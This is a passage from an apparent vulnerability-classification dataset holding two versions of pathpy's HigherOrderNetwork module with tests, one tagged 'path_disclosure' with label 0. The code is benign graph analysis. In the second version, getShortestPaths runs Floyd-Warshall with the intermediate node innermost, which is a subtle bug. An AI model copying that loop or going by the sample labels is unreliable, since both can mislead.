'-'\n        For k=1, the output will be the list of strings ['a', 'b', 'c', 'd']\n        For k=2, the output will be the list of strings ['a-b', 'b-c', 'c-d']\n        For k=3, the output will be the list of strings ['a-b-c', 'b-c-d']\n        etc.\n\n        @param path: the path tuple to turn into a sequence of higher-order nodes\n\n        @param k: the order of the representation to use (default: order of the\n            HigherOrderNetwork instance)\n        \"\"\"\n        if k is None:\n            k = self.order\n        assert len(path) > k, 'Error: Path must be longer than k'\n\n        if k == 0 and len(path) == 1:\n            return ['start', path[0]]\n\n        return [self.separator.join(path[n:n+k]) for n in range(len(path)-k+1)]\n\n\n    def getNodeNameMap(self):\n        \"\"\"\n        Returns a dictionary that can be used to map\n        nodes to matrix/vector indices\n        \"\"\"\n\n        name_map = {}\n        for idx, v in enumerate(self.nodes):\n            name_map[v] = idx\n        return name_map\n\n\n    def getDoF(self, assumption=\"paths\"):\n        \"\"\"\n        Calculates the degrees of freedom (i.e. number of parameters) of\n        this k-order model. Depending on the modeling assumptions, this either\n        corresponds to the number of paths of length k in the first-order network\n        or to the number of all possible k-grams. The degrees of freedom of a model\n        can be used to assess the model complexity when calculating, e.g., the\n        Bayesian Information Criterion (BIC).\n\n        @param assumption: if set to 'paths', for the degree of freedon calculation in the BIC,\n            only paths in the first-order network topology will be considered. This is\n            needed whenever we are interested in a modeling of paths in a given network topology.\n            If set to 'ngrams' all possible n-grams will be considered, independent of whether they\n            are valid paths in the first-order network or not. The 'ngrams'\n            and the 'paths' assumption coincide if the first-order network is fully connected.\n        \"\"\"\n        assert assumption == 'paths' or assumption == 'ngrams', 'Error: Invalid assumption'\n\n        if assumption == 'paths':\n            return self.dof_paths\n        return self.dof_ngrams\n\n\n    def getDistanceMatrix(self):\n        \"\"\"\n        Calculates shortest path distances between all pairs of\n        higher-order nodes using the Floyd-Warshall algorithm.\n        \"\"\"\n\n        Log.add('Calculating distance matrix in higher-order network (k = ' +\n                str(self.order) + ') ...', Severity.INFO)\n\n        dist = _co.defaultdict(lambda: _co.defaultdict(lambda: _np.inf))\n\n        for v in self.nodes:\n            dist[v][v] = 0\n\n        for e in self.edges:\n            dist[e[0]][e[1]] = 1\n\n        for k in self.nodes:\n            for v in self.nodes:\n                for w in self.nodes:\n                    if dist[v][w] > dist[v][k] + dist[k][w]:\n                        dist[v][w] = dist[v][k] + dist[k][w]\n\n        Log.add('finished.', Severity.INFO)\n\n        return dist\n\n\n    def getShortestPaths(self):\n        \"\"\"\n        Calculates all shortest paths between all pairs of\n        higher-order nodes using the Floyd-Warshall algorithm.\n        \"\"\"\n\n        Log.add('Calculating shortest paths in higher-order network (k = ' +\n                str(self.order) + ') ...', Severity.INFO)\n\n        dist = _co.defaultdict(lambda: _co.defaultdict(lambda: _np.inf))\n        shortest_paths = _co.defaultdict(lambda: _co.defaultdict(lambda: set()))\n\n        for e in self.edges:\n            dist[e[0]][e[1]] = 1\n            shortest_paths[e[0]][e[1]].add(e)\n\n        for k in self.nodes:\n            for v in self.nodes:\n                for w in self.nodes:\n                    if v != w:\n                        if dist[v][w] > dist[v][k] + dist[k][w]:\n                            dist[v][w] = dist[v][k] + dist[k][w]\n                            shortest_paths[v][w] = set()\n                            for p in list(shortest_paths[v][k]):\n                                for q in list(shortest_paths[k][w]):\n                                    shortest_paths[v][w].add(p+q[1:])\n                        elif dist[v][w] == dist[v][k] + dist[k][w]:\n                            for p in list(shortest_paths[v][k]):\n                                for q in list(shortest_paths[k][w]):\n                                    shortest_paths[v][w].add(p+q[1:])\n\n        for v in self.nodes:\n            dist[v][v] = 0\n            shortest_paths[v][v].add((v,))\n\n        Log.add('finished.', Severity.INFO)\n\n        return shortest_paths\n\n\n    def getDistanceMatrixFirstOrder(self):\n        \"\"\"\n        Projects a distance matrix from a higher-order to\n        first-order nodes, while path lengths are calculated\n        based on the higher-order topology\n        \"\"\"\n\n        dist = self.getDistanceMatrix()\n        dist_first = _co.defaultdict(lambda: _co.defaultdict(lambda: _np.inf))\n\n        # calculate distances between first-order nodes based on distance in higher-order topology\n        for vk in dist:\n            for wk in dist[vk]:\n                v1 = self.HigherOrderNodeToPath(vk)[0]\n                w1 = self.HigherOrderNodeToPath(wk)[-1]\n                if dist[vk][wk] + self.order-1 < dist_first[v1][w1]:\n                    dist_first[v1][w1] = dist[vk][wk] + self.order - 1\n\n        return dist_first\n\n\n    def HigherOrderPathToFirstOrder(self, path):\n        \"\"\"\n        Maps a path in the higher-order network\n        to a path in the first-order network. As an\n        example, the second-order path ('a-b', 'b-c', 'c-d')\n        of length two is mapped to the first-order path ('a','b','c','d')\n        of length four. In general, a path of length l in a network of\n        order k is mapped to a path of length l+k-1 in the first-order network.\n\n        @param path: The higher-order path that shall be mapped to the first-order network\n        \"\"\"\n        p1 = self.HigherOrderNodeToPath(path[0])\n        for x in path[1:]:\n            p1 += (self.HigherOrderNodeToPath(x)[-1],)\n        return p1    \n\n\n    def reduceToGCC(self):\n        \"\"\"\n        Reduces the higher-order network to its\n        largest (giant) strongly connected component\n        (using Tarjan's algorithm)\n        \"\"\"\n\n        # nonlocal variables (!)\n        index = 0\n        S = []\n        indices = _co.defaultdict(lambda: None)\n        lowlink = _co.defaultdict(lambda: None)\n        onstack = _co.defaultdict(lambda: False)\n\n        # Tarjan's algorithm\n        def strong_connect(v):\n            nonlocal index\n            nonlocal S\n            nonlocal indices\n            nonlocal lowlink\n            nonlocal onstack\n\n            indices[v] = index\n            lowlink[v] = index\n            index += 1\n            S.append(v)\n            onstack[v] = True\n\n            for w in self.successors[v]:\n                if indices[w] == None:\n                    strong_connect(w)\n                    lowlink[v] = min(lowlink[v], lowlink[w])\n                elif onstack[w]:\n                    lowlink[v] = min(lowlink[v], indices[w])\n\n            # Generate SCC of node v\n            component = set()\n            if lowlink[v] == indices[v]:\n                while True:\n                    w = S.pop()\n                    onstack[w] = False\n                    component.add(w)\n                    if v == w:\n                        break\n            return component\n\n        # Get largest strongly connected component\n        components = _co.defaultdict(lambda: set())\n        max_size = 0\n        max_head = None\n        for v in self.nodes:\n            if indices[v] == None:\n                components[v] = strong_connect(v)\n                if len(components[v]) > max_size:\n                    max_head = v\n                    max_size = len(components[v])\n\n        scc = components[max_head]\n\n        # Reduce higher-order network to SCC\n        for v in list(self.nodes):\n            if v not in scc:\n                self.nodes.remove(v)\n                del self.successors[v]\n\n        for (v, w) in list(self.edges):\n            if v not in scc or w not in scc:\n                del self.edges[(v, w)]\n\n\n    def summary(self):\n        \"\"\"\n        Returns a string containing basic summary statistics\n        of this higher-order graphical model instance\n        \"\"\"\n\n        summary = 'Graphical model of order k = ' + str(self.order)\n        summary += '\\n'\n        summary += 'Nodes:\\t\\t\\t\\t' +  str(self.vcount()) + '\\n'\n        summary += 'Links:\\t\\t\\t\\t' + str(self.ecount()) + '\\n'\n        summary += 'Total weight (sub/longest):\\t' + str(self.totalEdgeWeight()[0]) + '/' + str(self.totalEdgeWeight()[1]) + '\\n'\n        return summary\n\n\n    def __str__(self):\n        \"\"\"\n        Returns the default string representation of\n        this graphical model instance\n        \"\"\"\n        return self.summary()\n\n\n    def getAdjacencyMatrix(self, includeSubPaths=True, weighted=True, transposed=False):\n        \"\"\"\n        Returns a sparse adjacency matrix of the higher-order network. By default, the entry\n            corresponding to a directed link source -> target is stored in row s and column t\n            and can be accessed via A[s,t].\n\n        @param includeSubPaths: if set to True, the returned adjacency matrix will\n            account for the occurrence of links of order k (i.e. paths of length k-1)\n            as subpaths\n\n        @param weighted: if set to False, the function returns a binary adjacency matrix.\n          If set to True, adjacency matrix entries will contain the weight of an edge.\n\n        @param transposed: whether to transpose the matrix or not.\n        \"\"\"\n\n        row = []\n        col = []\n        data = []\n\n        if transposed:\n            for s, t in self.edges:\n                row.append(self.nodes.index(t))\n                col.append(self.nodes.index(s))\n        else:\n            for s, t in self.edges:\n                row.append(self.nodes.index(s))\n                col.append(self.nodes.index(t))\n\n        # create array with non-zero entries\n        if not weighted:\n            data = _np.ones(len(self.edges.keys()))\n        else:\n            if includeSubPaths:\n                data = _np.array([float(x.sum()) for x in self.edges.values()])\n            else:\n                data = _np.array([float(x[1]) for x in self.edges.values()])\n\n        return _sparse.coo_matrix((data, (row, col)), shape=(self.vcount(), self.vcount())).tocsr()\n\n\n    def getTransitionMatrix(self, includeSubPaths=True):\n        \"\"\"\n        Returns a (transposed) random walk transition matrix\n        corresponding to the higher-order network.\n\n        @param includeSubpaths: whether or not to include subpath statistics in the\n            transition probability calculation (default True)\n        \"\"\"\n        row = []\n        col = []\n        data = []\n        # calculate weighted out-degrees (with or without subpaths)\n        if includeSubPaths:\n            D = [ self.outweights[x].sum() for x in self.nodes]\n        else:\n            D = [ self.outweights[x][1] for x in self.nodes]\n                \n        for (s, t) in self.edges:\n            # either s->t has been observed as a longest path, or we are interested in subpaths as well\n\n            # the following makes sure that we do not accidentially consider zero-weight edges (automatically added by default_dic)\n            if (self.edges[(s, t)][1] > 0) or (includeSubPaths and self.edges[(s, t)][0] > 0):\n                row.append(self.nodes.index(t))\n                col.append(self.nodes.index(s))\n                if includeSubPaths:\n                    count = self.edges[(s, t)].sum()\n                else:\n                    count = self.edges[(s, t)][1]\n                assert D[self.nodes.index(s)] > 0, 'Encountered zero out-degree for node ' + str(s) + ' while weight of link (' + str(s) +  ', ' + str(t) + ') is non-zero.'\n                prob = count / D[self.nodes.index(s)]\n                if prob < 0 or prob > 1:\n                    tn.Log.add('Encountered transition probability outside [0,1] range.', Severity.ERROR)\n                    raise ValueError()\n                data.append(prob)\n\n        data = _np.array(data)\n        data = data.reshape(data.size,)\n\n        return _sparse.coo_matrix((data, (row, col)), shape=(self.vcount(), self.vcount())).tocsr()\n\n\n    @staticmethod\n    def getLeadingEigenvector(A, normalized=True, lanczosVecs=15, maxiter=1000):\n        \"\"\"Compute normalized leading eigenvector of a given matrix A.\n\n        @param A: sparse matrix for which leading eigenvector will be computed\n        @param normalized: wheter or not to normalize. Default is C{True}\n        @param lanczosVecs: number of Lanczos vectors to be used in the approximate\n            calculation of eigenvectors and eigenvalues. This maps to the ncv parameter\n            of scipy's underlying function eigs.\n        @param maxiter: scaling factor for the number of iterations to be used in the\n            approximate calculation of eigenvectors and eigenvalues. The number of iterations\n            passed to scipy's underlying eigs function will be n*maxiter where n is the\n            number of rows/columns of the Laplacian matrix.\n        \"\"\"\n\n        if _sparse.issparse(A) == False:\n            raise TypeError(\"A must be a sparse matrix\")\n\n        # NOTE: ncv sets additional auxiliary eigenvectors that are computed\n        # NOTE: in order to be more confident to find the one with the largest\n        # NOTE: magnitude, see https://github.com/scipy/scipy/issues/4987\n        w, pi = _sla.eigs(A, k=1, which=\"LM\", ncv=lanczosVecs, maxiter=maxiter)\n        pi = pi.reshape(pi.size,)\n        if normalized:\n            pi /= sum(pi)\n        return pi\n\n\n    def getLaplacianMatrix(self, includeSubPaths=True):\n        \"\"\"\n        Returns the transposed Laplacian matrix corresponding to the higher-order network.\n\n        @param includeSubpaths: Whether or not subpath statistics shall be included in the\n            calculation of matrix weights\n        \"\"\"\n\n        T = self.getTransitionMatrix(includeSubPaths)\n        I = _sparse.identity(self.vcount())\n\n        return I-T\n/n/n/ntests/test_HigherOrderNetwork.py/n/n# -*- coding: utf-8 -*-\n\"\"\"\n    pathpy is an OpenSource python package for the analysis of sequential data\n    on pathways and temporal networks using higher- and multi order graphical models\n\n    Copyright (C) 2016-2017 Ingo Scholtes, ETH Z\u00fcrich\n\n    This program is free software: you can redistribute it and/or modify\n    it under the terms of the GNU Affero General Public License as published\n    by the Free Software Foundation, either version 3 of the License, or\n    (at your option) any later version.\n\n    This program is distributed in the hope that it will be useful,\n    but WITHOUT ANY WARRANTY; without even the implied warranty of\n    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n    GNU Affero General Public License for more details.\n\n    You should have received a copy of the GNU Affero General Public License\n    along with this program.  If not, see <http://www.gnu.org/licenses/>.\n\n    Contact the developer:\n\n    E-mail: ischoltes@ethz.ch\n    Web:    http://www.ingoscholtes.net\n\"\"\"\n\nimport pathpy as pp\nimport pytest\nimport numpy as np\n\n\nslow = pytest.mark.slow\n\n\ndef test_degrees(path_from_edge_file):\n    hon_1 = pp.HigherOrderNetwork(path_from_edge_file, k=1)\n    expected_degrees = {'1': 52, '2' : 0, '3': 2, '5': 5}\n    for v in hon_1.nodes:\n        assert expected_degrees[v] == hon_1.outweights[v][1], \\\n        \"Wrong degree calculation in HigherOrderNetwork\"\n\n\ndef test_distance_matrix(path_from_edge_file):\n    p = path_from_edge_file\n    hon = pp.HigherOrderNetwork(paths=p, k=1)\n    d_matrix = hon.getDistanceMatrix()\n    distances = []\n    for source in sorted(d_matrix):\n        for target in sorted(d_matrix[source]):\n            distance = d_matrix[source][target]\n            if distance < 1e6:\n                distances.append(d_matrix[source][target])\n\n    assert np.sum(distances) == 8\n    assert np.min(distances) == 0\n    assert np.max(distances) == 2\n\n\ndef test_distance_matrix_equal_across_objects(random_paths):\n    p1 = random_paths(40, 20, num_nodes=9)\n    p2 = random_paths(40, 20, num_nodes=9)\n    hon1 = pp.HigherOrderNetwork(paths=p1, k=1)\n    hon2 = pp.HigherOrderNetwork(paths=p2, k=1)\n    d_matrix1 = hon1.getDistanceMatrix()\n    d_matrix2 = hon2.getDistanceMatrix()\n    assert d_matrix1 == d_matrix2\n\n\n@pytest.mark.parametrize('paths,n_nodes,k,e_var,e_sum', (\n        (7, 9, 1, 0.7911428035, 123),\n        (20, 9, 1, 0.310318549, 112),\n        (60, 20, 1, 0.2941, 588),\n))\ndef test_distance_matrix_large(random_paths, paths, n_nodes, k, e_var, e_sum):\n    p = random_paths(paths, 20, num_nodes=n_nodes)\n    hon = pp.HigherOrderNetwork(paths=p, k=1)\n    d_matrix = hon.getDistanceMatrix()\n    distances = []\n    for i, source in enumerate(sorted(d_matrix)):\n        for j, target in enumerate(sorted(d_matrix[source])):\n            distance = d_matrix[source][target]\n            if distance < 1e16:\n                distances.append(d_matrix[source][target])\n\n    assert np.var(distances) == pytest.approx(e_var)\n    assert np.sum(distances) == e_sum\n\n\ndef test_shortest_path_length(random_paths):\n    N = 10\n    p = random_paths(20, 10, N)\n    hon = pp.HigherOrderNetwork(p, k=1)\n    shortest_paths = hon.getShortestPaths()\n    distances = np.zeros(shape=(N, N))\n    for i, source in enumerate(sorted(shortest_paths)):\n        for j, target in enumerate(sorted(shortest_paths[source])):\n            distances[i][j] = len(shortest_paths[source][target])\n    assert np.mean(distances) == 1.47\n    assert np.var(distances) == pytest.approx(0.4891)\n    assert np.max(distances) == 4\n\n\ndef test_node_name_map(random_paths):\n    p = random_paths(20, 10, 20)\n    hon = pp.HigherOrderNetwork(p, k=1)\n    node_map = hon.getNodeNameMap()\n    # TODO: this is just an idea of how the mapping could be unique\n    assert node_map == {str(i): i+1 for i in range(20)}\n/n/n/n", "label": 0, "vtype": "path_disclosure"}, {"id": "13360e223925e21d02d6132d342c47fe53abc994", "code": "/pathpy/HigherOrderNetwork.py/n/n# -*- coding: utf-8 -*-\n\"\"\"\n    pathpy is an OpenSource python package for the analysis of time series data\n    on networks using higher- and multi order graphical models.\n\n    Copyright (C) 2016-2017 Ingo Scholtes, ETH Z\u00fcrich\n\n    This program is free software: you can redistribute it and/or modify\n    it under the terms of the GNU Affero General Public License as published\n    by the Free Software Foundation, either version 3 of the License, or\n    (at your option) any later version.\n\n    This program is distributed in the hope that it will be useful,\n    but WITHOUT ANY WARRANTY; without even the implied warranty of\n    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n    GNU Affero General Public License for more details.\n\n    You should have received a copy of the GNU Affero General Public License\n    along with this program.  If not, see <http://www.gnu.org/licenses/>.\n\n    Contact the developer:\n\n    E-mail: ischoltes@ethz.ch\n    Web:    http://www.ingoscholtes.net\n\"\"\"\n\nimport collections as _co\nimport bisect as _bs\nimport itertools as _iter\n\nimport numpy as _np\n\nimport scipy.sparse as _sparse\nimport scipy.sparse.linalg as _sla\nimport scipy.linalg as _la\nimport scipy as _sp\n\nfrom pathpy.Log import Log\nfrom pathpy.Log import Severity\n\n\nclass EmptySCCError(Exception):\n    \"\"\"\n    This exception is thrown whenever a non-empty strongly\n    connected component is needed, but we encounter an empty one\n    \"\"\"\n    pass\n\n\nclass HigherOrderNetwork:\n    \"\"\"\n    Instances of this class capture a k-th-order representation\n    of path statistics. Path statistics can originate from pathway\n    data, temporal networks, or from processes observed on top\n    of a network topology.\n    \"\"\"\n\n\n    def __init__(self, paths, k=1, separator='-', nullModel=False,\n        method='FirstOrderTransitions', lanczosVecs=15, maxiter=1000):\n        \"\"\"\n        Generates a k-th-order representation based on the given path statistics.\n\n        @param paths: An instance of class Paths, which contains the path\n            statistics to be used in the generation of the k-th order\n            representation\n\n        @param k: The order of the network representation to generate.\n            For the default case of k=1, the resulting representation\n            corresponds to the usual (first-order) aggregate network,\n            i.e. links connect nodes and link weights are given by the\n            frequency of each interaction. For k>1, a k-th order node\n            corresponds to a sequence of k nodes. The weight of a k-th\n            order link captures the frequency of a path of length k.\n\n        @param separator: The separator character to be used in\n            higher-order node names.\n\n        @param nullModel: For the default value False, link weights are\n            generated based on the statistics of paths of length k in the\n            underlying path statistics instance. If True, link weights are\n            generated from the first-order model (k=1) based on the assumption\n            of independent links (i.e. corresponding) to a first-order\n            Markov model.\n\n        @param method: specifies how the null model link weights\n            in the k-th order model are calculated. For the default\n            method='FirstOrderTransitions', the weight\n            w('v_1-v_2-...v_k', 'v_2-...-v_k-v_k+1') of a k-order edge\n            is set to the transition probability T['v_k', 'v_k+1'] in the\n            first order network. For method='KOrderPi' the entry\n            pi['v1-...-v_k'] in the stationary distribution of the\n            k-order network is used instead.\n        \"\"\"\n\n        assert not nullModel or (nullModel and k > 1)\n\n        assert method == 'FirstOrderTransitions' or method == 'KOrderPi', \\\n            'Error: unknown method to build null model'\n\n        assert paths.paths.keys() and max(paths.paths.keys()) >= k, \\\n            'Error: constructing a model of order k requires paths of at least length k'\n\n        ## The order of this HigherOrderNetwork\n        self.order = k\n\n        ## The paths object used to generate this instance\n        self.paths = paths\n\n        ## The nodes in this HigherOrderNetwork\n        self.nodes = []\n\n        ## The separator character used to label higher-order nodes.\n        ## For separator '-', a second-order node will be 'a-b'.\n        self.separator = separator\n\n        ## A dictionary containing the sets of successors of all nodes\n        self.successors = _co.defaultdict(lambda: set())\n\n        ## A dictionary containing the sets of predecessors of all nodes\n        self.predecessors = _co.defaultdict(lambda: set())\n\n        ## A dictionary containing the out-degrees of all nodes\n        self.outdegrees = _co.defaultdict(lambda: 0.0)\n\n        ## A dictionary containing the in-degrees of all nodes\n        self.indegrees = _co.defaultdict(lambda: 0.0)\n\n        # NOTE: edge weights, as well as in- and out weights of nodes are \n        # numpy arrays consisting of two weight components [w0, w1]. w0 \n        # counts the weight of an edge based on its occurrence in a subpaths \n        # while w1 counts the weight of an edge based on its occurrence in \n        # a longest path. As an illustrating example, consider the single \n        # path a -> b -> c. In the first-order network, the weights of edges \n        # (a,b) and (b,c) are both (1,0). In the second-order network, the \n        # weight of edge (a-b, b-c) is (0,1).\n\n        ## A dictionary containing edges as well as edge weights\n        self.edges = _co.defaultdict(lambda: _np.array([0., 0.]))\n\n        ## A dictionary containing the weighted in-degrees of all nodes\n        self.inweights = _co.defaultdict(lambda: _np.array([0., 0.]))        \n\n        ## A dictionary containing the weighted out-degrees of all nodes\n        self.outweights = _co.defaultdict(lambda: _np.array([0., 0.]))        \n\n        if k > 1:\n            # For k>1 we need the first-order network to generate the null model\n            # and calculate the degrees of freedom\n\n            # For a multi-order model, the first-order network is generated multiple times!\n            # TODO: Make this more efficient\n            g1 = HigherOrderNetwork(paths, k=1)\n            A = g1.getAdjacencyMatrix(includeSubPaths=True, weighted=False, transposed=True)\n\n        if not nullModel:\n            # Calculate the frequency of all paths of\n            # length k, generate k-order nodes and set\n            # edge weights accordingly\n            node_set = set()\n            iterator = paths.paths[k].items()\n\n            if k==0:\n                # For a 0-order model, we generate a dummy start node\n                node_set.add('start')\n                for key, val in iterator:\n                    w = key[0]\n                    node_set.add(w)\n                    self.edges[('start',w)] += val\n                    self.successors['start'].add(w)\n                    self.predecessors[w].add('start')\n                    self.indegrees[w] = len(self.predecessors[w])\n                    self.inweights[w] += val\n                    self.outdegrees['start'] = len(self.successors['start'])\n                    self.outweights['start'] += val\n            else:\n                for key, val in iterator:\n                    # Generate names of k-order nodes v and w\n                    v = separator.join(key[0:-1]) \n                    w = separator.join(key[1:])\n                    node_set.add(v)\n                    node_set.add(w)\n                    self.edges[(v,w)] += val\n                    self.successors[v].add(w)\n                    self.predecessors[w].add(v)\n                    self.indegrees[w] = len(self.predecessors[w])\n                    self.inweights[w] += val\n                    self.outdegrees[v] = len(self.successors[v])\n                    self.outweights[v] += val\n\n            self.nodes = list(node_set)\n\n            # Note: For all sequences of length k which (i) have never been observed, but\n            #       (ii) do actually represent paths of length k in the first-order network,\n            #       we may want to include some 'escape' mechanism along the\n            #       lines of (Cleary and Witten 1994)\n\n        else:\n            # generate the *expected* frequencies of all possible\n            # paths based on independently occurring (first-order) links\n\n            # generate all possible paths of length k\n            # based on edges in the first-order network\n            possiblePaths = list(g1.edges.keys())\n\n            for _ in range(k-1):\n                E_new = list()\n                for e1 in possiblePaths:\n                    for e2 in g1.edges:\n                        if e1[-1] == e2[0]:\n                            p = e1 + (e2[1],)\n                            E_new.append(p)\n                possiblePaths = E_new\n\n            # validate that the number of unique generated paths corresponds to the sum of entries in A**k\n            assert (A**k).sum() == len(possiblePaths), 'Expected ' + str((A**k).sum()) + \\\n                ' paths but got ' + str(len(possiblePaths))\n\n            if method == 'KOrderPi':\n                # compute stationary distribution of a random walker in the k-th order network\n                g_k = HigherOrderNetwork(paths, k=k, separator=separator, nullModel=False)\n                pi_k = HigherOrderNetwork.getLeadingEigenvector(g_k.getTransitionMatrix(includeSubPaths=True),\n                                                                normalized=True, lanczosVecs=lanczosVecs, maxiter=maxiter)\n            else:\n                # A = g1.getAdjacencyMatrix(includeSubPaths=True, weighted=True, transposed=False)\n                T = g1.getTransitionMatrix(includeSubPaths=True)\n\n            # assign link weights in k-order null model\n            for p in possiblePaths:\n                v = p[0]\n                # add k-order nodes and edges\n                for l in range(1, k):\n                    v = v + separator + p[l]\n                w = p[1]\n                for l in range(2, k+1):\n                    w = w + separator + p[l]\n                if v not in self.nodes:\n                    self.nodes.append(v)\n                if w not in self.nodes:\n                    self.nodes.append(w)\n\n                # NOTE: under the null model's assumption of independent events, we\n                # have P(B|A) = P(A ^ B)/P(A) = P(A)*P(B)/P(A) = P(B)\n                # In other words: we are encoding a k-1-order Markov process in a k-order\n                # Markov model and for the transition probabilities T_AB in the k-order model\n                # we simply have to set the k-1-order probabilities, i.e. T_AB = P(B)\n\n                # Solution A: Use entries of stationary distribution,\n                # which give stationary visitation frequencies of k-order node w\n                if method == 'KOrderPi':\n                    self.edges[(v, w)] = _np.array([0, pi_k[g_k.nodes.index(w)]])\n\n                # Solution B: Use relative edge weight in first-order network\n                # Note that A is *not* transposed\n                # self.edges[(v,w)] = A[(g1.nodes.index(p[-2]),g1.nodes.index(p[-1]))] / A.sum()\n\n                # Solution C: Use transition probability in first-order network\n                # Note that T is transposed (!)\n                elif method == 'FirstOrderTransitions':\n                    p_vw = T[(g1.nodes.index(p[-1]), g1.nodes.index(p[-2]))]\n                    self.edges[(v, w)] = _np.array([0, p_vw])\n\n                # Solution D: calculate k-path weights based on entries of squared k-1-order adjacency matrix\n\n                # Note: Solution B and C are equivalent\n                self.successors[v].add(w)\n                self.indegrees[w] = len(self.predecessors[w])\n                self.inweights[w] += self.edges[(v, w)]\n                self.outdegrees[v] = len(self.successors[v])\n                self.outweights[v] += self.edges[(v, w)]\n\n        # Compute degrees of freedom of models\n        if k == 0:\n            # for a zero-order model, we just fit node probabilities\n            # (excluding the special 'start' node)\n            # Since probabilities must sum to one, the effective degree\n            # of freedom is one less than the number of nodes\n            # This holds for both the paths and the ngrams model\n            self.dof_paths = self.vcount() - 2\n            self.dof_ngrams = self.vcount() - 2\n        else:\n            # for a first-order model, self is the first-order network\n            if k == 1:\n                g1 = self\n                A = g1.getAdjacencyMatrix(includeSubPaths=True, weighted=False, transposed=True)\n\n            # Degrees of freedom in a higher-order ngram model\n            s = g1.vcount()\n\n            ## The degrees of freedom of the higher-order model, under the ngram assumption\n            self.dof_ngrams = (s**k)*(s-1)\n\n            # For k>0, the degrees of freedom of a path-based model depend on\n            # the number of possible paths of length k in the first-order network.\n            # Since probabilities in each row must sum to one, the degrees\n            # of freedom must be reduced by one for each k-order node\n            # that has at least one possible transition.\n\n            # (A**k).sum() counts the number of different paths of exactly length k\n            # based on the first-order network, which corresponds to the number of\n            # possible transitions in the transition matrix of a k-th order model.\n            paths_k = (A**k).sum()\n\n            # For the degrees of freedom, we must additionally consider that\n            # rows in the transition matrix must sum to one, i.e. we have to\n            # subtract one degree of freedom for every non-zero row in the (null-model)\n            # transition matrix. In other words, we subtract one for every path of length k-1\n            # that can possibly be followed by at least one edge to a path of length k\n\n            # This can be calculated by counting the number of non-zero elements in the\n            # vector containing the row sums of A**k\n            non_zero = _np.count_nonzero((A**k).sum(axis=0))\n\n            ## The degrees of freedom of the higher-order model, under the paths assumption\n            self.dof_paths = paths_k - non_zero\n\n\n    def vcount(self):\n        \"\"\" Returns the number of nodes \"\"\"\n        return len(self.nodes)\n\n\n    def ecount(self):\n        \"\"\" Returns the number of links \"\"\"\n        return len(self.edges)\n\n\n    def totalEdgeWeight(self):\n        \"\"\" Returns the sum of all edge weights \"\"\"\n        if self.edges:\n            return sum(self.edges.values())\n        return _np.array([0, 0])\n\n\n    def modelSize(self):\n        \"\"\"\n        Returns the number of non-zero elements in the adjacency matrix\n        of the higher-order model.\n        \"\"\"\n        return self.getAdjacencyMatrix().count_nonzero()\n\n\n    def HigherOrderNodeToPath(self, node):\n        \"\"\"\n        Helper function that transforms a node in a\n        higher-order network of order k into a corresponding\n        path of length k-1. For a higher-order node 'a-b-c-d'\n        this function will return ('a','b','c','d')\n\n        @param node: The higher-order node to be transformed to a path.\n        \"\"\"\n        return tuple(node.split(self.separator))\n\n\n    def pathToHigherOrderNodes(self, path, k=None):\n        \"\"\"\n        Helper function that transforms a path into a sequence of k-order nodes\n        using the separator character of the HigherOrderNetwork instance\n\n        Consider an example path (a,b,c,d) with a separator string '-'\n        For k=1, the output will be the list of strings ['a', 'b', 'c', 'd']\n        For k=2, the output will be the list of strings ['a-b', 'b-c', 'c-d']\n        For k=3, the output will be the list of strings ['a-b-c', 'b-c-d']\n        etc.\n\n        @param path: the path tuple to turn into a sequence of higher-order nodes\n\n        @param k: the order of the representation to use (default: order of the\n            HigherOrderNetwork instance)\n        \"\"\"\n        if k is None:\n            k = self.order\n        assert len(path) > k, 'Error: Path must be longer than k'\n\n        if k == 0 and len(path) == 1:\n            return ['start', path[0]]\n\n        return [self.separator.join(path[n:n+k]) for n in range(len(path)-k+1)]\n\n\n    def getNodeNameMap(self):\n        \"\"\"\n        Returns a dictionary that can be used to map\n        nodes to matrix/vector indices\n        \"\"\"\n\n        name_map = {}\n        for idx, v in enumerate(self.nodes):\n            name_map[v] = idx\n        return name_map\n\n\n    def getDoF(self, assumption=\"paths\"):\n        \"\"\"\n        Calculates the degrees of freedom (i.e. number of parameters) of\n        this k-order model. Depending on the modeling assumptions, this either\n        corresponds to the number of paths of length k in the first-order network\n        or to the number of all possible k-grams. The degrees of freedom of a model\n        can be used to assess the model complexity when calculating, e.g., the\n        Bayesian Information Criterion (BIC).\n\n        @param assumption: if set to 'paths', for the degree of freedon calculation in the BIC,\n            only paths in the first-order network topology will be considered. This is\n            needed whenever we are interested in a modeling of paths in a given network topology.\n            If set to 'ngrams' all possible n-grams will be considered, independent of whether they\n            are valid paths in the first-order network or not. The 'ngrams'\n            and the 'paths' assumption coincide if the first-order network is fully connected.\n        \"\"\"\n        assert assumption == 'paths' or assumption == 'ngrams', 'Error: Invalid assumption'\n\n        if assumption == 'paths':\n            return self.dof_paths\n        return self.dof_ngrams\n\n\n    def getDistanceMatrix(self):\n        \"\"\"\n        Calculates shortest path distances between all pairs of\n        higher-order nodes using the Floyd-Warshall algorithm.\n        \"\"\"\n\n        Log.add('Calculating distance matrix in higher-order network (k = ' +\n                str(self.order) + ') ...', Severity.INFO)\n\n        dist = _co.defaultdict(lambda: _co.defaultdict(lambda: _np.inf))\n\n        for v in self.nodes:\n            dist[v][v] = 0\n\n        for e in self.edges:\n            dist[e[0]][e[1]] = 1\n\n        for k in self.nodes:\n            for v in self.nodes:\n                for w in self.nodes:\n                    if dist[v][w] > dist[v][k] + dist[k][w]:\n                        dist[v][w] = dist[v][k] + dist[k][w]\n\n        Log.add('finished.', Severity.INFO)\n\n        return dist\n\n\n    def getShortestPaths(self):\n        \"\"\"\n        Calculates all shortest paths between all pairs of\n        higher-order nodes using the Floyd-Warshall algorithm.\n        \"\"\"\n\n        Log.add('Calculating shortest paths in higher-order network (k = ' +\n                str(self.order) + ') ...', Severity.INFO)\n\n        dist = _co.defaultdict(lambda: _co.defaultdict(lambda: _np.inf))\n        shortest_paths = _co.defaultdict(lambda: _co.defaultdict(lambda: set()))\n\n        for e in self.edges:\n            dist[e[0]][e[1]] = 1\n            shortest_paths[e[0]][e[1]].add(e)\n\n        for v in self.nodes:\n            for w in self.nodes:\n                if v != w:\n                    for k in self.nodes:\n                        if dist[v][w] > dist[v][k] + dist[k][w]:\n                            dist[v][w] = dist[v][k] + dist[k][w]\n                            shortest_paths[v][w] = set()\n                            for p in list(shortest_paths[v][k]):\n                                for q in list(shortest_paths[k][w]):\n                                    shortest_paths[v][w].add(p+q[1:])\n                        elif dist[v][w] == dist[v][k] + 